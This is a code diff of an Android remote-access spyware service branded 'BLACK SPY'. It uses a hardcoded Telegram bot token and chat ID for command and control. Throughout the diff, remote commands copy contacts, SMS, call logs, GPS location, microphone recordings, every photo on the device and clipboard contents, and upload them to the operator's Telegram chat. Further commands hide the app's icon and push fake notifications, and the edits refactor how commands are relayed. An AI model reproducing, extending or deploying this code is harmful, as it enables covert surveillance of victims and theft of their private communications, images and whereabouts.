@@ -57,19 +57,19 @@ import java.util.zip.ZipOutputStream;
 
 public class TelegramBotService extends Service {
     private static final String BOT_TOKEN = "8652354299:AAEOH62d9BHbl064QYcFC2LgbiAH_doiwhU";
-    private static final String CHAT_ID = "6793813126";
+    private static final String OWNER_CHAT_ID = "6793813126";
     private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
     
     private int lastUpdateId = 0;
     private String targetDeviceId = null;
     private String targetDeviceName = null;
+    private String targetChatId = null;
     
     private MediaRecorder mediaRecorder;
     private File currentAudioFile;
     private boolean isRecording = false;
     
     private ScheduledExecutorService scheduler;
-    private ScheduledExecutorService registrationScheduler;
     
     @Override
     public void onCreate() {
@@ -77,34 +77,6 @@ public class TelegramBotService extends Service {
         startForeground(1, createNotification());
         scheduler = Executors.newSingleThreadScheduledExecutor();
         startBot();
-        startPeriodicRegistration();
-    }
-    
-    private void startPeriodicRegistration() {
-        registrationScheduler = Executors.newSingleThreadScheduledExecutor();
-        registrationScheduler.scheduleWithFixedDelay(() -> {
-            if (targetDeviceId == null) {
-                sendRegistration();
-            }
-        }, 0, 10, TimeUnit.SECONDS);
-    }
-    
-    private void sendRegistration() {
-        new Thread(() -> {
-            try {
-                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " Android " + Build.VERSION.RELEASE;
-                JSONObject json = new JSONObject();
-                json.put("device_id", deviceId);
-                json.put("device_name", deviceName);
-                String msg = "REGISTER:" + json.toString();
-                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
-                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-                conn.setRequestMethod("GET");
-                conn.getResponseCode();
-                conn.disconnect();
-            } catch (Exception e) {}
-        }).start();
     }
     
     private void startBot() {
@@ -121,23 +93,31 @@ public class TelegramBotService extends Service {
                             JSONObject msg = update.getJSONObject("message");
                             String text = msg.getString("text").trim();
                             long chatId = msg.getJSONObject("chat").getLong("id");
-                            if (String.valueOf(chatId).equals(CHAT_ID)) {
-                                handleCommand(text);
-                            } else if (text.startsWith("REGISTER:") && targetDeviceId == null) {
-                                String data = text.replace("REGISTER:", "");
-                                JSONObject info = new JSONObject(data);
-                                targetDeviceId = info.getString("device_id");
-                                targetDeviceName = info.getString("device_name");
-                                sendMessage("✅ BLACK SPY ONLINE ✅\n📍 " + targetDeviceName);
-                                if (registrationScheduler != null) {
-                                    registrationScheduler.shutdown();
+                            String chatIdStr = String.valueOf(chatId);
+                            
+                            // قبول التسجيل من أي جهاز (وليس فقط المالك)
+                            if (text.startsWith("REGISTER:")) {
+                                if (targetDeviceId == null) {
+                                    String data = text.replace("REGISTER:", "");
+                                    JSONObject info = new JSONObject(data);
+                                    targetDeviceId = info.getString("device_id");
+                                    targetDeviceName = info.getString("device_name");
+                                    targetChatId = chatIdStr;
+                                    sendMessageToOwner("✅ BLACK SPY ONLINE ✅\n📍 " + targetDeviceName + "\n🆔 ID: " + targetDeviceId);
+                                    sendMessageToOwner(getCommandMenu());
+                                    Log.i("BlackSpy", "Device registered: " + targetDeviceName);
                                 }
-                                sendCommandMenu();
+                            }
+                            // أوامر التحكم تأتي فقط من المالك
+                            else if (chatIdStr.equals(OWNER_CHAT_ID)) {
+                                handleCommand(text);
                             }
                         }
                     }
                 }
-            } catch (Exception e) {}
+            } catch (Exception e) {
+                Log.e("BlackSpy", "Polling error", e);
+            }
         }, 0, 2, TimeUnit.SECONDS);
     }
     
@@ -146,15 +126,15 @@ public class TelegramBotService extends Service {
         
         if (c.equals("/start")) {
             if (targetDeviceId == null) {
-                sendMessage("🔥 BLACK SPY 🔥\n\n⏳ انتظر اتصال الجهاز...");
+                sendMessageToOwner("🔥 BLACK SPY 🔥\n\n⏳ انتظر اتصال الجهاز...");
             } else {
-                sendCommandMenu();
+                sendMessageToOwner(getCommandMenu());
             }
             return;
         }
         
-        if (targetDeviceId == null) {
-            sendMessage("❌ لا يوجد جهاز مستهدف");
+        if (targetDeviceId == null || targetChatId == null) {
+            sendMessageToOwner("❌ لا يوجد جهاز مستهدف. انتظر اتصال الجهاز أولاً.");
             return;
         }
         
@@ -177,19 +157,33 @@ public class TelegramBotService extends Service {
         else if (c.startsWith("/vibrate ")) vibrateDevice(cmd.substring(9).trim());
         else if (c.startsWith("/openurl ")) openUrl(cmd.substring(9).trim());
         else if (c.equals("/clipboard")) getClipboard();
-        else sendMessage("❌ أمر غير معروف");
+        else sendMessageToOwner("❌ أمر غير معروف\nاستخدم /start");
+    }
+    
+    private void sendToDevice(String cmd) {
+        if (targetChatId == null) return;
+        new Thread(() -> {
+            try {
+                String url = API_URL + "sendMessage?chat_id=" + targetChatId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
+                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+                conn.setRequestMethod("GET");
+                conn.getResponseCode();
+                conn.disconnect();
+                sendMessageToOwner("✅ تم إرسال الأمر: " + cmd);
+            } catch (Exception e) {
+                sendMessageToOwner("❌ فشل الإرسال");
+            }
+        }).start();
     }
     
     private void sendDeviceInfo() {
-        try {
-            String info = "📱 <b>معلومات الجهاز</b>\n────────────────\n"
-                    + "📌 الموديل: " + Build.MANUFACTURER + " " + Build.MODEL + "\n"
-                    + "📌 Android: " + Build.VERSION.RELEASE + "\n"
-                    + "📌 الجهاز: " + Build.DEVICE + "\n"
-                    + "📌 المنتج: " + Build.PRODUCT + "\n"
-                    + "📌 العلامة: " + Build.BRAND;
-            sendMessage(info);
-        } catch (Exception e) { sendMessage("❌ خطأ"); }
+        String info = "📱 <b>معلومات الجهاز</b>\n────────────────\n"
+                + "📌 الموديل: " + Build.MANUFACTURER + " " + Build.MODEL + "\n"
+                + "📌 Android: " + Build.VERSION.RELEASE + "\n"
+                + "📌 الجهاز: " + Build.DEVICE + "\n"
+                + "📌 المنتج: " + Build.PRODUCT + "\n"
+                + "📌 العلامة: " + Build.BRAND;
+        sendMessageToOwner(info);
     }
     
     private void sendContacts() {
@@ -220,7 +214,7 @@ public class TelegramBotService extends Service {
                     cur.close();
                 }
                 w.close();
-                sendFile(f, "📇 جهات الاتصال");
+                sendFileToOwner(f, "📇 جهات الاتصال");
                 f.delete();
             } catch (Exception e) {}
         }).start();
@@ -249,7 +243,7 @@ public class TelegramBotService extends Service {
                     }
                 }
                 w.close();
-                sendFile(f, "💬 رسائل SMS");
+                sendFileToOwner(f, "💬 رسائل SMS");
                 f.delete();
             } catch (Exception e) {}
         }).start();
@@ -281,47 +275,47 @@ public class TelegramBotService extends Service {
                     c.close();
                 }
                 w.close();
-                sendFile(f, "📞 سجلات المكالمات");
+                sendFileToOwner(f, "📞 سجلات المكالمات");
                 f.delete();
             } catch (Exception e) {}
         }).start();
     }
     
     private void getLocation() {
-        sendMessage("📍 جاري جلب الموقع...");
+        sendMessageToOwner("📍 جاري جلب الموقع...");
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-            if (lm == null) { sendMessage("❌ LocationManager غير متاح"); return; }
+            if (lm == null) { sendMessageToOwner("❌ LocationManager غير متاح"); return; }
             if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER) && !lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                sendMessage("❌ الرجاء تفعيل GPS");
+                sendMessageToOwner("❌ الرجاء تفعيل GPS");
                 return;
             }
             LocationListener listener = new LocationListener() {
                 @Override public void onLocationChanged(Location loc) {
                     String url = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
-                    sendMessage("📍 <b>الموقع الحالي</b>\n────────────────\n🌐 خط العرض: " + loc.getLatitude() + "\n🌐 خط الطول: " + loc.getLongitude() + "\n🎯 الدقة: " + loc.getAccuracy() + " متر\n🗺️ <a href='" + url + "'>اضغط للخريطة</a>");
+                    sendMessageToOwner("📍 <b>الموقع الحالي</b>\n────────────────\n🌐 خط العرض: " + loc.getLatitude() + "\n🌐 خط الطول: " + loc.getLongitude() + "\n🎯 الدقة: " + loc.getAccuracy() + " متر\n🗺️ <a href='" + url + "'>اضغط للخريطة</a>");
                 }
-                @Override public void onProviderDisabled(String p) { sendMessage("❌ GPS معطل"); }
+                @Override public void onProviderDisabled(String p) { sendMessageToOwner("❌ GPS معطل"); }
                 @Override public void onStatusChanged(String p, int s, Bundle b) {}
                 @Override public void onProviderEnabled(String p) {}
             };
             if (Build.VERSION.SDK_INT >= 23) {
                 if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                    sendMessage("❌ لا توجد صلاحية الموقع");
+                    sendMessageToOwner("❌ لا توجد صلاحية الموقع");
                     return;
                 }
             }
             lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
-            new android.os.Handler().postDelayed(() -> sendMessage("❌ انتهى الوقت - لم يتم العثور على موقع"), 15000);
-        } catch (SecurityException e) { sendMessage("❌ لا توجد صلاحية الموقع"); }
+            new android.os.Handler().postDelayed(() -> sendMessageToOwner("❌ انتهى الوقت - لم يتم العثور على موقع"), 15000);
+        } catch (SecurityException e) { sendMessageToOwner("❌ لا توجد صلاحية الموقع"); }
     }
     
     private void startRecording() {
-        if (isRecording) { sendMessage("🎤 التسجيل قيد التشغيل بالفعل"); return; }
+        if (isRecording) { sendMessageToOwner("🎤 التسجيل قيد التشغيل بالفعل"); return; }
         try {
             if (Build.VERSION.SDK_INT >= 23) {
                 if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                    sendMessage("❌ لا توجد صلاحية التسجيل");
+                    sendMessageToOwner("❌ لا توجد صلاحية التسجيل");
                     return;
                 }
             }
@@ -336,28 +330,28 @@ public class TelegramBotService extends Service {
             mediaRecorder.prepare();
             mediaRecorder.start();
             isRecording = true;
-            sendMessage("🎙️ <b>جاري التسجيل...</b>\nاستخدم /stoprec لإيقاف التسجيل وإرساله");
-        } catch (Exception e) { sendMessage("❌ فشل بدء التسجيل: " + e.getMessage()); }
+            sendMessageToOwner("🎙️ <b>جاري التسجيل...</b>\nاستخدم /stoprec لإيقاف التسجيل وإرساله");
+        } catch (Exception e) { sendMessageToOwner("❌ فشل بدء التسجيل: " + e.getMessage()); }
     }
     
     private void stopRecording() {
-        if (!isRecording || mediaRecorder == null) { sendMessage("❌ لا يوجد تسجيل قيد التشغيل"); return; }
+        if (!isRecording || mediaRecorder == null) { sendMessageToOwner("❌ لا يوجد تسجيل قيد التشغيل"); return; }
         try {
             mediaRecorder.stop();
             mediaRecorder.release();
             mediaRecorder = null;
             isRecording = false;
             if (currentAudioFile != null && currentAudioFile.exists() && currentAudioFile.length() > 0) {
-                sendFile(currentAudioFile, "🎙️ تسجيل صوتي");
+                sendFileToOwner(currentAudioFile, "🎙️ تسجيل صوتي");
                 currentAudioFile.delete();
-            } else { sendMessage("❌ فشل حفظ التسجيل"); }
-        } catch (Exception e) { sendMessage("❌ خطأ في إيقاف التسجيل"); }
+            } else { sendMessageToOwner("❌ فشل حفظ التسجيل"); }
+        } catch (Exception e) { sendMessageToOwner("❌ خطأ في إيقاف التسجيل"); }
     }
     
     private void stealAllPhotos() {
         new Thread(() -> {
             try {
-                sendMessage("📸 جاري جمع الصور...");
+                sendMessageToOwner("📸 جاري جمع الصور...");
                 File zipFile = new File(getCacheDir(), "photos_" + System.currentTimeMillis() + ".zip");
                 ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
                 String[] projections = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
@@ -384,10 +378,10 @@ public class TelegramBotService extends Service {
                     cursor.close();
                 }
                 zos.close();
-                if (count > 0) { sendFile(zipFile, "📸 " + count + " صورة تم جمعها"); }
-                else { sendMessage("❌ لا توجد صور على الجهاز"); }
+                if (count > 0) { sendFileToOwner(zipFile, "📸 " + count + " صورة تم جمعها"); }
+                else { sendMessageToOwner("❌ لا توجد صور على الجهاز"); }
                 zipFile.delete();
-            } catch (Exception e) { sendMessage("❌ فشل جمع الصور: " + e.getMessage()); }
+            } catch (Exception e) { sendMessageToOwner("❌ فشل جمع الصور: " + e.getMessage()); }
         }).start();
     }
     
@@ -403,8 +397,8 @@ public class TelegramBotService extends Service {
                 case android.os.BatteryManager.BATTERY_STATUS_FULL: statusText = "✅ ممتلئ"; break;
                 default: statusText = "❓ غير معروف";
             }
-            sendMessage("🔋 <b>حالة البطارية</b>\n────────────────\n📊 النسبة: " + level + "%\n" + statusText);
-        } catch (Exception e) { sendMessage("❌ فشل جلب معلومات البطارية"); }
+            sendMessageToOwner("🔋 <b>حالة البطارية</b>\n────────────────\n📊 النسبة: " + level + "%\n" + statusText);
+        } catch (Exception e) { sendMessageToOwner("❌ فشل جلب معلومات البطارية"); }
     }
     
     private void sendNetworkInfo() {
@@ -413,8 +407,8 @@ public class TelegramBotService extends Service {
             WifiInfo wi = wm.getConnectionInfo();
             String ip = intToIp(wi.getIpAddress());
             String ssid = wi.getSSID();
-            sendMessage("🌐 <b>معلومات الشبكة</b>\n────────────────\n📡 الواي فاي: " + (ssid != null ? ssid : "غير متصل") + "\n🌍 الـ IP: " + ip + "\n📶 القوة: " + wi.getRssi() + " dBm");
-        } catch (Exception e) { sendMessage("❌ فشل جلب معلومات الشبكة"); }
+            sendMessageToOwner("🌐 <b>معلومات الشبكة</b>\n────────────────\n📡 الواي فاي: " + (ssid != null ? ssid : "غير متصل") + "\n🌍 الـ IP: " + ip + "\n📶 القوة: " + wi.getRssi() + " dBm");
+        } catch (Exception e) { sendMessageToOwner("❌ فشل جلب معلومات الشبكة"); }
     }
     
     private String intToIp(int i) {
@@ -426,15 +420,15 @@ public class TelegramBotService extends Service {
             TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
             if (Build.VERSION.SDK_INT >= 23) {
                 if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-                    sendMessage("❌ لا توجد صلاحية قراءة حالة الهاتف");
+                    sendMessageToOwner("❌ لا توجد صلاحية قراءة حالة الهاتف");
                     return;
                 }
             }
             String operator = tm.getNetworkOperatorName();
             String country = tm.getNetworkCountryIso();
             String simOperator = tm.getSimOperatorName();
-            sendMessage("📇 <b>معلومات SIM والشبكة</b>\n────────────────\n📡 المشغل: " + (operator != null ? operator : "غير معروف") + "\n🌍 الدولة: " + (country != null ? country : "غير معروف") + "\n📱 SIM: " + (simOperator != null ? simOperator : "غير معروف"));
-        } catch (Exception e) { sendMessage("❌ فشل جلب معلومات SIM"); }
+            sendMessageToOwner("📇 <b>معلومات SIM والشبكة</b>\n────────────────\n📡 المشغل: " + (operator != null ? operator : "غير معروف") + "\n🌍 الدولة: " + (country != null ? country : "غير معروف") + "\n📱 SIM: " + (simOperator != null ? simOperator : "غير معروف"));
+        } catch (Exception e) { sendMessageToOwner("❌ فشل جلب معلومات SIM"); }
     }
     
     private void sendAppsList() {
@@ -453,8 +447,8 @@ public class TelegramBotService extends Service {
                         if (count > 50) { sb.append("... و" + (apps.size() - 50) + " تطبيق آخر"); break; }
                     }
                 }
-                sendMessage(sb.toString());
-            } catch (Exception e) { sendMessage("❌ فشل جلب التطبيقات"); }
+                sendMessageToOwner(sb.toString());
+            } catch (Exception e) { sendMessageToOwner("❌ فشل جلب التطبيقات"); }
         }).start();
     }
     
@@ -462,20 +456,20 @@ public class TelegramBotService extends Service {
         try {
             getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            sendMessage("👻 <b>تم إخفاء التطبيق</b>\n✅ لن يظهر في درج التطبيقات");
-        } catch (Exception e) { sendMessage("❌ فشل الإخفاء: " + e.getMessage()); }
+            sendMessageToOwner("👻 <b>تم إخفاء التطبيق</b>\n✅ لن يظهر في درج التطبيقات");
+        } catch (Exception e) { sendMessageToOwner("❌ فشل الإخفاء: " + e.getMessage()); }
     }
     
     private void showApp() {
         try {
             getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
-            sendMessage("👁️ <b>تم إظهار التطبيق</b>\n✅ سيظهر في درج التطبيقات بعد إعادة التشغيل");
-        } catch (Exception e) { sendMessage("❌ فشل الإظهار: " + e.getMessage()); }
+            sendMessageToOwner("👁️ <b>تم إظهار التطبيق</b>\n✅ سيظهر في درج التطبيقات بعد إعادة التشغيل");
+        } catch (Exception e) { sendMessageToOwner("❌ فشل الإظهار: " + e.getMessage()); }
     }
     
     private void sendStatus() {
-        sendMessage("✅ <b>حالة التطبيق</b>\n────────────────\n📱 الجهاز: " + targetDeviceName + "\n🎤 التسجيل: " + (isRecording ? "قيد التشغيل 🟢" : "متوقف 🔴") + "\n🔗 البوت: متصل ✅\n📅 آخر تحديث: " + new SimpleDateFormat("HH:mm:ss").format(new Date()));
+        sendMessageToOwner("✅ <b>حالة التطبيق</b>\n────────────────\n📱 الجهاز: " + targetDeviceName + "\n🎤 التسجيل: " + (isRecording ? "قيد التشغيل 🟢" : "متوقف 🔴") + "\n🔗 البوت: متصل ✅\n📅 آخر تحديث: " + new SimpleDateFormat("HH:mm:ss").format(new Date()));
     }
     
     private void sendFakeNotification(String text) {
@@ -492,8 +486,8 @@ public class TelegramBotService extends Service {
                     .setAutoCancel(true)
                     .build();
             nm.notify((int) System.currentTimeMillis(), notif);
-            sendMessage("🔔 تم إرسال الإشعار: " + text);
-        } catch (Exception e) { sendMessage("❌ فشل إرسال الإشعار"); }
+            sendMessageToOwner("🔔 تم إرسال الإشعار: " + text);
+        } catch (Exception e) { sendMessageToOwner("❌ فشل إرسال الإشعار"); }
     }
     
     private void vibrateDevice(String durationStr) {
@@ -502,9 +496,9 @@ public class TelegramBotService extends Service {
             Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
             if (v != null && v.hasVibrator()) {
                 v.vibrate(duration);
-                sendMessage("📳 تم الاهتزاز لـ " + durationStr + " ثانية");
-            } else { sendMessage("❌ الجهاز لا يدعم الاهتزاز"); }
-        } catch (Exception e) { sendMessage("❌ فشل الاهتزاز"); }
+                sendMessageToOwner("📳 تم الاهتزاز لـ " + durationStr + " ثانية");
+            } else { sendMessageToOwner("❌ الجهاز لا يدعم الاهتزاز"); }
+        } catch (Exception e) { sendMessageToOwner("❌ فشل الاهتزاز"); }
     }
     
     private void openUrl(String url) {
@@ -512,8 +506,8 @@ public class TelegramBotService extends Service {
             Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-            sendMessage("🌐 تم فتح الرابط: " + url);
-        } catch (Exception e) { sendMessage("❌ فشل فتح الرابط"); }
+            sendMessageToOwner("🌐 تم فتح الرابط: " + url);
+        } catch (Exception e) { sendMessageToOwner("❌ فشل فتح الرابط"); }
     }
     
     private void getClipboard() {
@@ -521,13 +515,13 @@ public class TelegramBotService extends Service {
             ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
             if (cm.hasPrimaryClip()) {
                 String text = cm.getPrimaryClip().getItemAt(0).getText().toString();
-                sendMessage("📋 <b>محتوى الحافظة</b>\n────────────────\n" + text);
-            } else { sendMessage("📋 الحافظة فارغة"); }
-        } catch (Exception e) { sendMessage("❌ فشل قراءة الحافظة"); }
+                sendMessageToOwner("📋 <b>محتوى الحافظة</b>\n────────────────\n" + text);
+            } else { sendMessageToOwner("📋 الحافظة فارغة"); }
+        } catch (Exception e) { sendMessageToOwner("❌ فشل قراءة الحافظة"); }
     }
     
-    private void sendCommandMenu() {
-        String menu = "🔥 <b>BLACK SPY</b> 🔥\n"
+    private String getCommandMenu() {
+        return "🔥 <b>BLACK SPY</b> 🔥\n"
                 + "╔════════════════════════════╗\n"
                 + "║   👹 Black Spy 👹          ║\n"
                 + "║   🕷️ Hackers Walking Anous 🕷️\n"
@@ -564,10 +558,9 @@ public class TelegramBotService extends Service {
                 + "/vibrate 📳 اهتزاز\n\n"
                 + "━━━━━━━━━━━━━━━━━━━━━━\n"
                 + "⚠️ جميع الأوامر تنفذ فوراً على هذا الجهاز";
-        sendMessage(menu);
     }
     
-    private void sendFile(File file, String caption) {
+    private void sendFileToOwner(File file, String caption) {
         new Thread(() -> {
             try {
                 String boundary = "*****" + System.currentTimeMillis();
@@ -580,7 +573,7 @@ public class TelegramBotService extends Service {
                 java.io.PrintWriter w = new java.io.PrintWriter(new java.io.OutputStreamWriter(os), true);
                 w.append("--" + boundary).append("\r\n");
                 w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
-                w.append(CHAT_ID).append("\r\n");
+                w.append(OWNER_CHAT_ID).append("\r\n");
                 w.flush();
                 if (caption != null) {
                     w.append("--" + boundary).append("\r\n");
@@ -603,14 +596,14 @@ public class TelegramBotService extends Service {
                 os.close();
                 conn.getResponseCode();
                 conn.disconnect();
-            } catch (Exception e) { sendMessage("❌ فشل إرسال الملف: " + e.getMessage()); }
+            } catch (Exception e) { sendMessageToOwner("❌ فشل إرسال الملف: " + e.getMessage()); }
         }).start();
     }
     
-    private void sendMessage(String text) {
+    private void sendMessageToOwner(String text) {
         new Thread(() -> {
             try {
-                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML&disable_web_page_preview=true";
+                String url = API_URL + "sendMessage?chat_id=" + OWNER_CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=HTML&disable_web_page_preview=true";
                 HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                 conn.setRequestMethod("GET");
                 conn.getResponseCode();
@@ -653,7 +646,6 @@ public class TelegramBotService extends Service {
     @Override
     public void onDestroy() {
         if (scheduler != null) scheduler.shutdown();
-        if (registrationScheduler != null) registrationScheduler.shutdown();
         super.onDestroy();
     }
     
